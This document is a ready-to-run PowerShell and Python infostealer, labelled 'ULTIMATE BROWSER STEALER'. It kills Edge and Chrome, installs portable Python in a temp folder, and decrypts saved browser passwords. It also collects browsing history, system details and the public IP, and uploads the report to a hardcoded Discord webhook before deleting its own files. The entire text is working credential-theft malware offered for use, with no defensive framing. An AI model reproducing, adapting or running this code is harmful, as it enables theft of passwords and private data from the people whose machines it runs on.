$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    $json = @{content=$m.Substring(0,[Math]::Min(1900,$m.Length))} | ConvertTo-Json
    Invoke-RestMethod -Uri $wh -Method Post -Body $json -ContentType "application/json" | Out-Null
}

Send "🎯 ULTIMATE BROWSER STEALER - Starting..."

# Tuer les navigateurs
Get-Process msedge,chrome -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

cd $env:TEMP

# Installer Python si nécessaire
if (!(Test-Path "py\python.exe")) {
    Send "📥 Installing Python portable..."
    
    [Net.ServicePointManager]::SecurityProtocol='Tls12'
    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "py.zip" -UseBasicParsing
    Expand-Archive "py.zip" "py" -Force
    (Get-Content "py\python311._pth") -replace '#import site','import site' | Out-File "py\python311._pth" -Encoding ascii
    Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "py\gp.py" -UseBasicParsing
    
    cd py
    .\python.exe gp.py --no-warn-script-location 2>$null
    .\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
    cd ..
    
    Remove-Item py.zip -Force
    
    Send "✅ Python installed"
}

cd py

# Script Python ULTRA-COMPLET
$script = @'
import os, json, base64, sqlite3, shutil, win32crypt, platform, socket, subprocess
from datetime import datetime
from Crypto.Cipher import AES

WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(m):
    subprocess.run(["powershell","-C",f"Invoke-RestMethod -Uri '{WH}' -Method Post -Body (@{{content='{m[:1900]}'}}|ConvertTo-Json) -ContentType 'application/json'"], capture_output=True, shell=True)

send("🔍 Collecting system info...")

# ===== SYSTEM INFO =====
report = "="*60 + "\n"
report += "SYSTEM INFORMATION\n"
report += "="*60 + "\n\n"

try:
    report += f"Computer Name: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
    report += f"Username: {os.environ.get('USERNAME', 'Unknown')}\n"
    report += f"OS: {platform.system()} {platform.release()} {platform.version()}\n"
    report += f"Architecture: {platform.machine()}\n"
    report += f"Processor: {platform.processor()}\n"
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        report += f"Hostname: {hostname}\n"
        report += f"Local IP: {local_ip}\n"
    except:
        pass
    
    # Récupérer IP publique
    try:
        import urllib.request
        public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
        report += f"Public IP: {public_ip}\n"
    except:
        pass
    
    report += f"Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    
    # Infos disque
    try:
        import psutil
        disk = psutil.disk_usage('C:')
        report += f"Disk C: {disk.total // (1024**3)} GB total, {disk.free // (1024**3)} GB free\n"
    except:
        pass
    
except Exception as e:
    report += f"Error collecting system info: {e}\n"

report += "\n" + "="*60 + "\n\n"

send("💾 Extracting browser data...")

# ===== FONCTION DÉCRYPTAGE =====
def decrypt_password(encrypted, key):
    try:
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return "[Decrypt Failed]"

def get_browser_data(browser_path, browser_name):
    login_data = browser_path + r"\Default\Login Data"
    local_state = browser_path + r"\..\Local State"
    history_path = browser_path + r"\Default\History"
    
    if not os.path.exists(login_data):
        return None
    
    # Récupérer la clé
    try:
        with open(local_state) as f:
            enc_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except:
        return None
    
    data = {"name": browser_name, "passwords": [], "history": []}
    
    # PASSWORDS
    try:
        shutil.copy2(login_data, "temp_login.db")
        conn = sqlite3.connect("temp_login.db")
        c = conn.cursor()
        
        for url, user, enc_pwd in c.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"):
            pwd = decrypt_password(enc_pwd, key)
            data["passwords"].append({"url": url, "username": user, "password": pwd})
        
        conn.close()
        os.remove("temp_login.db")
    except Exception as e:
        data["passwords"].append({"error": str(e)})
    
    # HISTORY
    try:
        if os.path.exists(history_path):
            shutil.copy2(history_path, "temp_history.db")
            conn = sqlite3.connect("temp_history.db")
            c = conn.cursor()
            
            for url, title, count, last_visit in c.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 50"):
                data["history"].append({"url": url, "title": title, "visits": count})
            
            conn.close()
            os.remove("temp_history.db")
    except:
        pass
    
    return data

# ===== EDGE =====
edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
edge_data = get_browser_data(os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"), "EDGE")

if edge_data:
    report += "="*60 + "\n"
    report += f"MICROSOFT EDGE - {len(edge_data['passwords'])} PASSWORDS\n"
    report += "="*60 + "\n\n"
    
    for p in edge_data["passwords"]:
        if "error" not in p:
            report += f"URL: {p['url']}\n"
            report += f"Username: {p['username']}\n"
            report += f"Password: {p['password']}\n\n"
    
    if edge_data["history"]:
        report += "\n--- EDGE HISTORY (Top 50) ---\n\n"
        for h in edge_data["history"]:
            report += f"[{h['visits']} visits] {h['url']}\n"
            if h['title']:
                report += f"  Title: {h['title']}\n"
        report += "\n"

# ===== CHROME =====
chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")
chrome_data = get_browser_data(chrome_path, "CHROME")

if chrome_data:
    report += "="*60 + "\n"
    report += f"GOOGLE CHROME - {len(chrome_data['passwords'])} PASSWORDS\n"
    report += "="*60 + "\n\n"
    
    for p in chrome_data["passwords"]:
        if "error" not in p:
            report += f"URL: {p['url']}\n"
            report += f"Username: {p['username']}\n"
            report += f"Password: {p['password']}\n\n"
    
    if chrome_data["history"]:
        report += "\n--- CHROME HISTORY (Top 50) ---\n\n"
        for h in chrome_data["history"]:
            report += f"[{h['visits']} visits] {h['url']}\n"
            if h['title']:
                report += f"  Title: {h['title']}\n"
        report += "\n"

# ===== BRAVE (liste seulement) =====
brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")

if os.path.exists(brave_path):
    report += "="*60 + "\n"
    report += "BRAVE BROWSER - v20 ENCRYPTED\n"
    report += "="*60 + "\n\n"
    
    try:
        shutil.copy2(brave_path, "temp_brave.db")
        conn = sqlite3.connect("temp_brave.db")
        c = conn.cursor()
        
        accounts = []
        for url, user in c.execute("SELECT origin_url, username_value FROM logins WHERE username_value != ''"):
            accounts.append(f"{user} @ {url}")
        
        report += f"⚠️ Brave uses App-Bound Encryption v20\n"
        report += f"Cannot decrypt passwords offline\n"
        report += f"Found {len(accounts)} accounts:\n\n"
        
        for acc in accounts:
            report += f"- {acc}\n"
        
        conn.close()
        os.remove("temp_brave.db")
    except:
        report += "Error reading Brave database\n"
    
    report += "\n"

# ===== STATISTIQUES =====
total_passwords = 0
if edge_data:
    total_passwords += len([p for p in edge_data["passwords"] if "error" not in p])
if chrome_data:
    total_passwords += len([p for p in chrome_data["passwords"] if "error" not in p])

report += "="*60 + "\n"
report += f"TOTAL: {total_passwords} passwords extracted\n"
report += "="*60 + "\n"

# Sauvegarder
with open("FULL_REPORT.txt", "w", encoding="utf-8") as f:
    f.write(report)

send(f"✅ Extraction complete - {total_passwords} passwords")

print("OK")
'@

$script | Out-File "ultimate_stealer.py" -Encoding UTF8

Send "🚀 Running extraction..."

$result = .\python.exe ultimate_stealer.py 2>&1

Send "📤 Uploading report..."

if (Test-Path "FULL_REPORT.txt") {
    curl.exe -F "file=@FULL_REPORT.txt" $wh
    Remove-Item FULL_REPORT.txt -Force
} else {
    Send "❌ No report generated"
}

Remove-Item ultimate_stealer.py -Force

cd $env:TEMP

Send "🏁 MISSION COMPLETE"
